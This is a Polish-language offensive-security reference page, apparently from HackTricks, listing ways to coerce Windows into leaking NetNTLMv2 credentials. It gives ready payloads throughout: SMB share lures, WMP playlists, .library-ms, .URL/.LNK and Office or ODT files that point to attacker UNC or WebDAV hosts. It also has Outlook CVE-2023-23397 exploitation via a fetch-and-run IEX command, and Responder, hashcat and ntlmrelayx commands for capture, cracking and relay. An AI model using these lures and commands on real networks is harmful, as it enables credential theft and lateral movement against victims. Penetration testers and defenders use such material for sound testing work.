# Miejsca, z których można wykraść poświadczenia NTLM

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od pobrania pliku Microsoft Word z Internetu po źródło wycieków NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Zapisywalny udział SMB + przynęty UNC wyzwalane przez Eksplorator (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisywać w udziale przeglądanym w Eksploratorze przez użytkowników lub zaplanowane zadania**, umieść pliki, których metadane wskazują na Twój UNC (np. `\\ATTACKER\share`). Wyświetlenie folderu wyzwala **niejawną autentykację SMB** i ujawnia **NetNTLMv2** naszemu listenerowi.<sup>[[1]](#references)</sup>

1. **Wygeneruj przynęty** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF itp.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Umieść je w udziale z prawem zapisu** (w dowolnym folderze, który ofiara otworzy):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Nasłuchuj i łam**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows może jednocześnie otworzyć kilka plików; do wszystkiego, co Explorer wyświetla w podglądzie (`BROWSE TO FOLDER`), nie trzeba klikać.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli uda Ci się nakłonić cel do otwarcia lub wyświetlenia podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz leak Net-NTLMv2, wskazując ścieżkę UNC jako wpis playlisty. WMP spróbuje pobrać wskazany plik multimedialny przez SMB i automatycznie się uwierzytelni.<sup>[[3]](#references)[[4]](#references)</sup>

Przykładowy payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Przebieg zbierania i crackingu:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Wyciek NTLM przez plik .library-ms osadzony w ZIP-ie (CVE-2025-24071/24055)

Windows Explorer niebezpiecznie obsługuje pliki .library-ms otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie lub uruchomienie pliku .library-ms z archiwum powoduje, że Explorer odpytuje ścieżkę UNC i wysyła do atakującego dane uwierzytelniające NTLM. W ten sposób można uzyskać NetNTLMv2, które można złamać offline lub potencjalnie przekazać dalej.<sup>[[2]](#references)</sup>

Minimalny plik .library-ms wskazujący na UNC atakującego

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML-em (ustaw swój adres IP/nazwę hosta).
- Spakuj go do ZIP-a (w Windows: Wyślij do → Folder skompresowany (zip)) i dostarcz archiwum celowi.
- Uruchom listener przechwytujący NTLM i poczekaj, aż ofiara otworzy plik .library-ms z archiwum ZIP.

### Ścieżka dźwięku przypomnienia kalendarza Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook dla Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB po uruchomieniu przypomnienia, powodując leak danych Net-NTLMv2 użytkownika bez żadnego kliknięcia. Poprawkę wydano 14 marca 2023 r., ale problem nadal ma duże znaczenie w przypadku starszych/niezaktualizowanych środowisk oraz przy analizie historycznych incydentów.<sup>[[5]](#references)</sup>

Szybkie wykorzystanie za pomocą PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Po stronie nasłuchującej:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notatki
- Ofiara musi mieć uruchomiony Outlook dla Windows w chwili wyzwolenia przypomnienia.
- leak ujawnia Net‑NTLMv2, który nadaje się do łamania offline lub relay (nie pass-the-hash).


### leak NTLM typu zero-click oparty na ikonie .LNK/.URL (CVE‑2025‑50154 – obejście CVE‑2025‑24054)

Eksplorator Windows automatycznie renderuje ikony skrótów. Niedawne badania wykazały, że nawet po poprawce Microsoftu z kwietnia 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez kliknięć, hostując cel skrótu w ścieżce UNC i pozostawiając ikonę lokalnie (obejście poprawki otrzymało oznaczenie CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Eksplorator pobiera metadane ze zdalnego celu, wysyłając NTLM na serwer SMB atakującego.<sup>[[6]](#references)</sup>

Minimalny payload Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Payload skrótu programu (.lnk) za pomocą PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Pomysły na dostarczenie
- Umieść skrót w pliku ZIP i nakłoń ofiarę do jego przeglądania.
- Umieść skrót w zapisywalnym udziale, który ofiara otworzy.
- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Eksplorator wyświetlał ich podgląd.

### Wyciek NTLM bez kliknięcia przez ścieżkę ikony ExtraData w pliku .LNK (CVE‑2026‑25185)

Windows ładuje metadane `.lnk` podczas **wyświetlania/podglądu** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że powłoka rozpoznaje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas ładowania**, wysyłając wychodzące uwierzytelnienie NTLM, jeśli ścieżka jest zdalna.

Kluczowe warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
- Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (warunek uruchomienia procedury aktualizacji ikony).
- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym **TargetUnicode**.
- Program ładujący rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` dla uzyskanej ścieżki.

Jeśli `TargetUnicode` wskazuje ścieżkę UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje wychodzące uwierzytelnienie. Ta sama ścieżka ładowania może zostać uruchomiona także przez **indeksowanie** i **skanowanie przez AV**, co tworzy praktyczną powierzchnię wycieku bez kliknięcia.<sup>[[7]](#references)</sup>

Narzędzia badawcze (parser/generator/interfejs użytkownika) do tworzenia i analizowania tych struktur bez używania interfejsu graficznego Windows są dostępne w projekcie **LnkMeMaybe**.<sup>[[8]](#references)</sup>


### Wymuszenie uwierzytelnienia WebDAV / weryfikacja poświadczeń przez `davclnt.dll,DavSetCookie`

Natywnego **klienta WebDAV** można użyć do wymuszenia uwierzytelnienia bieżącej sesji logowania wobec dowolnego punktu końcowego **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Dlaczego to przydatne:
- W przypadku **serwera WebDAV kontrolowanego przez atakującego** może wywołać **NTLM przez HTTP** bez wdrażania własnego klienta.
- W przypadku **hostów wewnętrznych** to dyskretny sposób na **sprawdzenie, gdzie skradzione dane uwierzytelniające są akceptowane** przed rozpoczęciem ruchu lateralnego.<sup>[[9]](#references)</sup>
- To polecenie jest dobrą alternatywą, gdy **ruch wychodzący SMB jest filtrowany**, ale **HTTP/WebDAV** jest nadal dostępny.

Uwagi operacyjne:
- Usługa **WebClient** musi być uruchomiona na hoście źródłowym.
- `rundll32.exe` ładuje `davclnt.dll` i sprawia, że system Windows obsługuje uwierzytelnianie WebDAV przy użyciu **danych uwierzytelniających bieżącego użytkownika**.<sup>[[10]](#references)</sup>
- Jeśli kierujesz ruch do kontrolowanej przez siebie infrastruktury, użyj nasłuchującego/relay HTTP obsługującego NTLM, na przykład:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Z perspektywy wykrywania wielokrotne uruchomienia `rundll32.exe davclnt.dll,DavSetCookie` w odniesieniu do wielu systemów wewnętrznych są wyraźnym sygnałem **weryfikacji poświadczeń / przygotowań do ruchu lateralnego przypominających spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>

### Zdalne URI powiadomień do wymuszania uwierzytelniania NTLM przez WebDAV

Jeśli aplikacja otwiera zdalnie skonfigurowane adresy wyskakujących okienek lub widoków internetowych, adres `file://` może wymusić uwierzytelnianie wychodzące **bez otwierania dokumentu ani ładunku wykonywalnego**. W przypadku AOMEI powiadomienie o rozmiarze jednego piksela wskazywało zdalną ścieżkę WebDAV `DavWWWRoot`. System Windows próbował użyć zintegrowanego uwierzytelniania dla tego adresu, ujawniając odpowiedź na wyzwanie NetNTLMv2. Wyzwalaczem było otwarcie URI, a nie widoczność wyskakującego okienka; działanie nadal zależy od procedury obsługi URI w aplikacji, [działania Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) oraz zasad uwierzytelniania wychodzącego.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

W przeciwieństwie do opisanej wyżej metody wymuszania uwierzytelniania za pomocą poleceń, ten punkt wejścia wymaga kontroli nad [konfiguracją powiadomień oprogramowania](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Jednopikselowe okno i wysoki priorytet pokazują, że nawet niepozorne powiadomienie może sprawić, że klient odwoła się do URI.<sup>[[16]](#references)</sup>

### Wstrzyknięcie zdalnego szablonu Office (.docx/.dotm) w celu wymuszenia NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz dołączony szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie przez SMB.

Minimalne zmiany w relacjach DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Edytuj word/_rels/settings.xml.rels i ustaw rId1337 tak, aby wskazywał na Twój UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Spakuj ponownie do .docx i dostarcz. Uruchom nasłuchujący SMB capture listener i poczekaj, aż plik zostanie otwarty.

### Zewnętrzny obiekt ODT do uwierzytelniania SMB

Gdy ścieżka przesyłania dokumentów akceptuje `.odt`, ale cel nie otwiera plików Office `.docx`, użyj zewnętrznego obiektu OpenDocument zamiast szablonu Office. Moduł Metasploit `auxiliary/fileformat/odt_badodt` generuje plik ODT, którego `content.xml` zawiera odwołanie `draw:object` uruchamiane przy otwarciu, takie jak poniższe. Ustaw `LHOST` na adres SMB listenera, prześlij ODT dozwoloną ścieżką i przechwyć odpowiedź NetNTLMv2 przychodzącą z sieci, gdy użytkownik lub procesor dokumentów otworzy plik. Kontrola rozszerzenia nazwy pliku nie sprawdza osadzonego adresu URL; ograniczenia przychodzącego NTLM na celu nie muszą blokować uwierzytelniania wychodzącego.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Pomysły na działania po przechwyceniu, takie jak relay lub nadużywanie NTLM, znajdziesz w:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Przynęty na zapisywalnym udziale + przechwycenie Respondera → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak uwierzytelniania ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak NTLM przez WMP → junction NTFS do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 podatności NTLM: niezałatane zagrożenia eskalacją uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft łagodzi podatność Outlook EoP (CVE‑2023‑23397) i wyjaśnia leak NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, jeden NTLM: obejście poprawki zabezpieczeń Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: przegląd CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Narzędzie TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Gdy dzwoni dział IT Support: analiza kampanii ModeloRAT, od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – nagłówek davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – żądanie WebDAV przez Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Ciekawe miejsca do kradzieży hashy NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — przechwycenie NTLM przez obiekt zewnętrzny ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group i Mandiant – badanie krótkotrwałego manipulowania łańcuchem dostaw](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
